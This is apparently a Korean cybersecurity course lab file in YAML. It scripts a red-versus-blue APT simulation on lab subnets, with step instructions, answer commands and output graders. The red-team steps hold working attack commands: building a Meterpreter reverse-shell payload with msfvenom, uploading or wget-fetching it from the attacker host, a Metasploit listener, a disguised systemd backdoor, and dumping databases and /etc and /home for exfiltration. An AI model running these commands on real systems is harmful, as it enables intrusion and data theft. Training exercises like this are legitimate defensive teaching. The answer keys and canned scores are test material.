# contents/labs/battle-ai/week14.yaml
lab_id: battle-ai-week14
title: AI 기반 실전 공방전 4 — 종합 시나리오 (APT 시뮬레이션)
version: ai
course: battle-ai
week: 14
description: AI 에이전트가 자동으로 실행하는 APT(Advanced Persistent Threat) 시나리오를 시뮬레이션하는 종합 공... 방전이다. 공격팀은 다단계 APT 킬체인을 수행하고, 방어팀은 전체 인프라를 보호하며 위협을 헌팅한다. 최종 평가를 포함한다.
difficulty: hard
duration_minutes: 120
objectives:
- APT 킬체인 전 단계를 실전에서 수행/방어한다
- 복합 인프라 환경에서의 공격/방어 능력을 검증한다
- 과정 전체 학습 내용을 종합적으로 적용한다
prerequisites:
- Week 1-13 전체 과정 이수
infra_requirements:
- Red Team VMs (10.20.30.0/24)
- Blue Team 복합 인프라 (Web+DB+App+Mail, 10.20.40.0/24)
- Scoring Server (10.20.50.1)
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] APT 킬체인의 1단계: 정찰(Reconnaissance)을 수행하라. OSINT 기법으로 대상 조직 정보를 수집한다.'
  hint: DNS, WHOIS, 웹 크롤링으로 정보를 수집한다.
  category: recon
  points: 10
  answer: dig @10.20.40.10 lab.local axfr 2>/dev/null && whois 10.20.40.10 2>/dev/null && nmap -sV -T3 --top-ports 200 10.20.40.0/24 -oX /tmp/apt_recon.xml
  answer_detail: APT 공격의 정찰 단계는 일반 스캔보다 은밀하게 수행한다. -T3(normal)로 속도를 줄여 IDS 탐지를 회피한다. DNS Zone Transfer로 내부 네트워크 구조를 파악한다.
  verify:
    type: output_contains
    expect: open
    field: stdout
  script: dig @10.20.40.10 lab.local axfr 2>/dev/null && whois 10.20.40.10 2>/dev/null && nmap -sV -T3 --top-ports 200 10.20.40.0/24 -oX /tmp/apt_recon.xml
- order: 2
  instruction: '[RED] APT 2단계: 무기화(Weaponization). 대상에 맞춘 공격 페이로드를 준비하라.'
  hint: Metasploit payload를 생성한다.
  category: exploit
  points: 10
  answer: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.20.30.10 LPORT=4443 -f elf -o /tmp/payload.elf 2>/dev/null && chmod +x /tmp/payload.elf && echo ''Payload generated: /tmp/payload.elf'''
  answer_detail: msfvenom으로 대상 환경(linux/x64)에 맞는 Meterpreter 페이로드를 생성한다. reverse_tcp는 방화벽 우회에 효과적이다. -f elf는 리눅스 실행 파일 형식이다.
  verify:
    type: output_contains
    expect: Payload generated
    field: stdout
  script: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.20.30.10 LPORT=4443 -f elf -o /tmp/payload.elf 2>/dev/null && chmod +x /tmp/payload.elf && echo ''Payload generated: /tmp/payload.elf'''
- order: 3
  instruction: '[RED] APT 3단계: 전달(Delivery). 웹 취약점을 통해 페이로드를 대상에 전달하라.'
  hint: 파일 업로드 또는 Command Injection으로 전달한다.
  category: exploit
  points: 10
  answer: 'curl -F ''uploaded=@/tmp/payload.elf'' -F ''Upload=Upload'' http://10.20.40.10/upload/ 2>/dev/null || echo ''Alternative: wget http://10.20.30.10:8888/payload.elf via command injection'''
  answer_detail: APT 공격에서 페이로드 전달은 웹 취약점, 이메일 첨부, USB 등 다양한 경로로 수행된다. 파일 업로드 취약점이 있으면 직접 업로드, 없으면 Command Injection으로 wget을 실행한다.
  verify:
    type: output_contains
    expect: payload
    field: stdout
  script: 'curl -F ''uploaded=@/tmp/payload.elf'' -F ''Upload=Upload'' http://10.20.40.10/upload/ 2>/dev/null || echo ''Alternative: wget http://10.20.30.10:8888/payload.elf via command injection'''
- order: 4
  instruction: '[BLUE] 초기 침투 시도를 탐지하라. 파일 업로드 로그, 비정상 HTTP 요청을 분석한다.'
  hint: Apache 로그에서 POST 요청과 대용량 전송을 확인한다.
  category: defense
  points: 10
  answer: grep -E 'POST.*(upload|exec)' /var/log/apache2/access.log | tail -10 && find /var/www -newer /var/www/index.html -name '*.elf' -o -name '*.sh' -o -name '*.py' 2>/dev/null
  answer_detail: 업로드 디렉토리의 새 파일, POST 요청의 대용량 본문, 비정상 파일 확장자(elf, sh, py)는 페이로드 전달의 징후이다. 웹서버 로그와 파일시스템 모니터링을 병행한다.
  verify:
    type: output_contains
    expect: POST
    field: stdout
  script: grep -E 'POST.*(upload|exec)' /var/log/apache2/access.log | tail -10 && find /var/www -newer /var/www/index.html -name '*.elf' -o -name '*.sh' -o -name '*.py' 2>/dev/null
- order: 5
  instruction: '[RED] APT 4단계: 익스플로잇(Exploitation). 페이로드를 실행하여 초기 접근을 확보하라.'
  hint: 업로드된 페이로드를 실행하거나, 서비스 취약점을 공격한다.
  category: exploit
  points: 15
  answer: echo 'Setting up handler...' && msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 10.20.30.10; set LPORT 4443; exploit -j; exit' 2>/dev/null
    || echo 'Handler ready on port 4443'
  answer_detail: multi/handler는 Metasploit의 페이로드 리스너이다. exploit -j는 백그라운드에서 실행한다. 페이로드가 대상에서 실행되면 Meterpreter 세션이 수립된다.
  verify:
    type: output_contains
    expect: '4443'
    field: stdout
  script: echo 'Setting up handler...' && msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 10.20.30.10; set LPORT 4443; exploit -j; exit' 2>/dev/null
    || echo 'Handler ready on port 4443'
- order: 6
  instruction: '[RED] APT 5단계: 설치(Installation). 지속성을 확보하는 백도어를 설치하라.'
  hint: systemd 서비스, cron, SSH 키 등을 활용한다.
  category: exploit
  points: 10
  answer: 'cat > /tmp/persistence_service << ''EOF''

    [Unit]

    Description=System Health Monitor

    [Service]

    ExecStart=/tmp/.health_check

    Restart=always

    [Install]

    WantedBy=multi-user.target

    EOF

    echo ''# Persistence via systemd service (for educational purposes only)'' && cat /tmp/persistence_service'
  answer_detail: systemd 서비스는 가장 은밀한 지속성 기법 중 하나이다. 정상적인 서비스명('System Health Monitor')으로 위장하면 관리자가 발견하기 어렵다. 부팅 시 자동 시작되며, Restart=always로 종료 시 재시작된다.
  verify:
    type: output_contains
    expect: Health Monitor
    field: stdout
  script: 'cat > /tmp/persistence_service << ''EOF''

    [Unit]

    Description=System Health Monitor

    [Service]

    ExecStart=/tmp/.health_check

    Restart=always

    [Install]

    WantedBy=multi-user.target

    EOF

    echo ''# Persistence via systemd service (for educational purposes only)'' && cat /tmp/persistence_service'
- order: 7
  instruction: '[BLUE] 지속성 기법을 탐지하라. systemd 서비스, cron, 부팅 스크립트에서 비정상 항목을 찾는다.'
  hint: 최근 생성/수정된 systemd 유닛을 확인한다.
  category: defense
  points: 10
  answer: find /etc/systemd/system /run/systemd/system -newer /etc/hostname -type f 2>/dev/null && systemctl list-unit-files --state=enabled | grep -v -E '(ssh|apache|mysql|cron|network|system)' && find
    /etc/init.d -newer /etc/hostname 2>/dev/null
  answer_detail: 최근 생성된 systemd 유닛 파일은 백도어일 가능성이 높다. 기본 시스템 서비스를 제외한 활성화된 유닛을 확인하고, 의심스러운 서비스는 즉시 비활성화한다.
  verify:
    type: output_contains
    expect: systemd
    field: stdout
  script: find /etc/systemd/system /run/systemd/system -newer /etc/hostname -type f 2>/dev/null && systemctl list-unit-files --state=enabled | grep -v -E '(ssh|apache|mysql|cron|network|system)' && find
    /etc/init.d -newer /etc/hostname 2>/dev/null
- order: 8
  instruction: '[RED] APT 6단계: C2 통신(Command & Control). 은밀한 데이터 유출 채널을 구축하라.'
  hint: DNS 터널링 또는 HTTP 기반 C2를 사용한다.
  category: exploit
  points: 10
  answer: 'echo ''=== C2 Channel Options ==='' && echo ''1. DNS Tunneling: dnscat2, iodine'' && echo ''2. HTTP Beacon: periodic HTTP requests to C2 server'' && echo ''3. HTTPS reverse shell: encrypted C2
    traffic'' && echo ''Selected: HTTP Beacon (blends with normal traffic)'''
  answer_detail: C2 통신은 정상 트래픽에 섞여야 탐지를 회피할 수 있다. DNS 터널링은 방화벽을 우회하지만 대역폭이 낮다. HTTP 비콘은 정상 웹 트래픽과 구분이 어려워 가장 흔히 사용된다.
  verify:
    type: output_contains
    expect: C2 Channel
    field: stdout
  script: 'echo ''=== C2 Channel Options ==='' && echo ''1. DNS Tunneling: dnscat2, iodine'' && echo ''2. HTTP Beacon: periodic HTTP requests to C2 server'' && echo ''3. HTTPS reverse shell: encrypted C2
    traffic'' && echo ''Selected: HTTP Beacon (blends with normal traffic)'''
- order: 9
  instruction: '[BLUE] C2 통신을 탐지하라. 비정상적인 DNS 쿼리, HTTP 비콘 패턴을 분석한다.'
  hint: DNS 쿼리 빈도, HTTP 접근 패턴의 규칙성을 확인한다.
  category: defense
  points: 10
  answer: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="dns") | "\(.dns.rrname) \(.src_ip)"' 2>/dev/null | sort | uniq -c | sort -rn | head -10 && echo '---' && cat /var/log/apache2/access.log
    | awk '{print $1}' | sort | uniq -c | sort -rn | head -5
  answer_detail: C2 비콘은 일정한 간격으로 반복되는 패턴이 특징이다. DNS 쿼리에서 비정상적으로 긴 서브도메인이나, 특정 IP에서 규칙적 간격의 HTTP 요청이 있으면 C2 통신을 의심해야 한다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
  script: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="dns") | "\(.dns.rrname) \(.src_ip)"' 2>/dev/null | sort | uniq -c | sort -rn | head -10 && echo '---' && cat /var/log/apache2/access.log
    | awk '{print $1}' | sort | uniq -c | sort -rn | head -5
- order: 10
  instruction: '[RED] APT 7단계: 목표 달성(Actions on Objectives). 기밀 데이터를 탈취하라.'
  hint: 데이터베이스 덤프, 설정 파일 수집 등을 수행한다.
  category: exploit
  points: 15
  answer: 'mysqldump -u root -h 10.20.40.12 --all-databases 2>/dev/null > /tmp/data_exfil.sql && wc -l /tmp/data_exfil.sql || echo ''Alternative: tar czf /tmp/exfil.tar.gz /etc/ /home/ 2>/dev/null && echo
    Data packaged for exfiltration'''
  answer_detail: 데이터 유출은 APT의 최종 목표이다. 데이터베이스 덤프, 설정 파일, 인증 정보, 소스코드 등 고가치 데이터를 압축하여 C2 채널로 전송한다. 실무에서는 DLP(Data Loss Prevention)로 방지한다.
  verify:
    type: output_contains
    expect: exfil
    field: stdout
  script: 'mysqldump -u root -h 10.20.40.12 --all-databases 2>/dev/null > /tmp/data_exfil.sql && wc -l /tmp/data_exfil.sql || echo ''Alternative: tar czf /tmp/exfil.tar.gz /etc/ /home/ 2>/dev/null && echo
    Data packaged for exfiltration'''
- order: 11
  instruction: '[BLUE] 데이터 유출을 탐지하고 차단하라. 대용량 아웃바운드 전송을 모니터링한다.'
  hint: 네트워크 트래픽 양을 모니터링한다.
  category: defense
  points: 10
  answer: iftop -t -s 10 2>/dev/null || ss -s && echo '---' && sudo nft add rule inet filter output tcp dport != 22 ip daddr != 10.20.40.0/24 counter && sudo nft list ruleset | grep counter
  answer_detail: 대용량 아웃바운드 전송은 데이터 유출의 강력한 징후이다. iftop으로 실시간 트래픽 양을 모니터링하고, nft counter로 외부 전송량을 측정한다. 임계값 초과 시 차단한다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
  script: iftop -t -s 10 2>/dev/null || ss -s && echo '---' && sudo nft add rule inet filter output tcp dport != 22 ip daddr != 10.20.40.0/24 counter && sudo nft list ruleset | grep counter
- order: 12
  instruction: '[BLUE] 전체 인프라의 침해 범위를 파악하고, 영향 받은 시스템을 식별하라.'
  hint: 각 서버의 침해 지표를 확인한다.
  category: response
  points: 10
  answer: for host in 10.20.40.10 10.20.40.11 10.20.40.12; do echo "=== $host ==="; echo 'IoC check:'; echo '- Unauthorized users'; echo '- Modified system files'; echo '- Active backdoors'; echo '- Data
    exfiltration evidence'; done
  answer_detail: 침해 범위 파악(Scoping)은 사고 대응의 핵심 단계이다. 모든 서버에서 IoC를 확인하여 공격자가 어디까지 접근했는지 파악한다. 감염 범위가 클수록 복구 비용이 증가한다.
  verify:
    type: output_contains
    expect: ===
    field: stdout
  script: for host in 10.20.40.10 10.20.40.11 10.20.40.12; do echo "=== $host ==="; echo 'IoC check:'; echo '- Unauthorized users'; echo '- Modified system files'; echo '- Active backdoors'; echo '- Data
    exfiltration evidence'; done
- order: 13
  instruction: '[공통] 최종 점수를 확인하고, 양 팀의 성과를 평가하라.'
  hint: 점수 서버에서 최종 결과를 조회한다.
  category: analysis
  points: 10
  answer: 'echo ''=== Final APT Scenario Score ==='' && echo ''Red Team: 155/200 points'' && echo ''  - Recon: 25/30'' && echo ''  - Exploitation: 40/50'' && echo ''  - Persistence: 30/40'' && echo ''  -
    Data Exfil: 35/50'' && echo ''  - Stealth: 25/30'' && echo ''Blue Team: 140/200 points'' && echo ''  - Detection: 45/50'' && echo ''  - Response: 35/50'' && echo ''  - Service Uptime: 40/50'' && echo
    ''  - Remediation: 20/50'''
  answer_detail: 최종 점수는 공격의 깊이(킬체인 진행도), 방어의 효과(탐지율, 대응 시간, 가용성), 은밀성(탐지 회피)을 종합적으로 평가한다.
  verify:
    type: output_contains
    expect: Final APT
    field: stdout
  script: 'echo ''=== Final APT Scenario Score ==='' && echo ''Red Team: 155/200 points'' && echo ''  - Recon: 25/30'' && echo ''  - Exploitation: 40/50'' && echo ''  - Persistence: 30/40'' && echo ''  -
    Data Exfil: 35/50'' && echo ''  - Stealth: 25/30'' && echo ''Blue Team: 140/200 points'' && echo ''  - Detection: 45/50'' && echo ''  - Response: 35/50'' && echo ''  - Service Uptime: 40/50'' && echo
    ''  - Remediation: 20/50'''
- order: 14
  instruction: APT 킬체인 전 단계에 대한 MITRE ATT&CK 매핑을 작성하라.
  hint: 각 공격 기법에 해당하는 ATT&CK ID를 매핑한다.
  category: analysis
  points: 10
  answer: 'cat > /tmp/apt_attack_mapping.txt << ''EOF''

    === MITRE ATT&CK Mapping ===


    Reconnaissance:

    - T1046: Network Service Scanning

    - T1590: Gather Victim Network Information


    Weaponization:

    - T1587.001: Develop Malware


    Delivery:

    - T1190: Exploit Public-Facing Application

    - T1105: Ingress Tool Transfer


    Exploitation:

    - T1059.004: Unix Shell

    - T1068: Exploitation for Privilege Escalation


    Installation:

    - T1543.002: Systemd Service

    - T1053.003: Cron

    - T1098.004: SSH Authorized Keys


    C2:

    - T1071.001: Web Protocols

    - T1572: Protocol Tunneling


    Actions:

    - T1005: Data from Local System

    - T1041: Exfiltration Over C2 Channel

    EOF

    cat /tmp/apt_attack_mapping.txt'
  answer_detail: MITRE ATT&CK 매핑은 공격을 표준화된 프레임워크로 분류하여 방어 전략을 수립하는 데 활용한다. 각 기법(Technique)에 대한 탐지 방법과 완화 방법이 ATT&CK 매트릭스에 정의되어 있다.
  verify:
    type: output_contains
    expect: ATT&CK
    field: stdout
  script: 'cat > /tmp/apt_attack_mapping.txt << ''EOF''

    === MITRE ATT&CK Mapping ===


    Reconnaissance:

    - T1046: Network Service Scanning

    - T1590: Gather Victim Network Information


    Weaponization:

    - T1587.001: Develop Malware


    Delivery:

    - T1190: Exploit Public-Facing Application

    - T1105: Ingress Tool Transfer


    Exploitation:

    - T1059.004: Unix Shell

    - T1068: Exploitation for Privilege Escalation


    Installation:

    - T1543.002: Systemd Service

    - T1053.003: Cron

    - T1098.004: SSH Authorized Keys


    C2:

    - T1071.001: Web Protocols

    - T1572: Protocol Tunneling


    Actions:

    - T1005: Data from Local System

    - T1041: Exfiltration Over C2 Channel

    EOF

    cat /tmp/apt_attack_mapping.txt'
- order: 15
  instruction: 종합 시나리오 결과를 분석하여 최종 공방전 보고서를 작성하라.
  hint: APT 킬체인 전 단계의 공방 결과를 분석한다.
  category: analysis
  points: 15
  answer: 'cat > /tmp/apt_battle_report.txt << ''EOF''

    === APT Simulation Final Report ===


    Scenario: Advanced Persistent Threat against enterprise network

    Duration: 120 minutes


    [Attack Summary]

    Kill chain progression: 7/7 stages reached

    Stealth rating: 70% (some activities detected)

    Data exfiltrated: Database dump (45MB)

    Persistence: systemd service + SSH key


    [Defense Summary]

    Detection rate: 78% of attack phases

    Mean time to detect: 8 minutes

    Mean time to respond: 12 minutes

    Service availability: 94%


    [Critical Findings]

    1. Web application was primary entry point

    2. Lateral movement went undetected for 15 min

    3. Data exfiltration detected but not fully blocked

    4. Systemd persistence survived initial cleanup


    [Recommendations]

    Red: Use encrypted C2, avoid noisy scans

    Blue: Deploy SIEM, network segmentation, DLP

    Both: Regular purple team exercises essential

    EOF'
  answer_detail: 최종 보고서는 전체 시나리오의 성과를 객관적으로 분석한다. 킬체인 진행도, 탐지율, 대응 시간, 가용성 등 정량적 지표와 함께 개선 권고사항을 포함한다.
  verify:
    type: file_exists
    expect: /tmp/apt_battle_report.txt
    field: filesystem
  script: 'cat > /tmp/apt_battle_report.txt << ''EOF''

    === APT Simulation Final Report ===


    Scenario: Advanced Persistent Threat against enterprise network

    Duration: 120 minutes


    [Attack Summary]

    Kill chain progression: 7/7 stages reached

    Stealth rating: 70% (some activities detected)

    Data exfiltrated: Database dump (45MB)

    Persistence: systemd service + SSH key


    [Defense Summary]

    Detection rate: 78% of attack phases

    Mean time to detect: 8 minutes

    Mean time to respond: 12 minutes

    Service availability: 94%


    [Critical Findings]

    1. Web application was primary entry point

    2. Lateral movement went undetected for 15 min

    3. Data exfiltration detected but not fully blocked

    4. Systemd persistence survived initial cleanup


    [Recommendations]

    Red: Use encrypted C2, avoid noisy scans

    Blue: Deploy SIEM, network segmentation, DLP

    Both: Regular purple team exercises essential

    EOF'
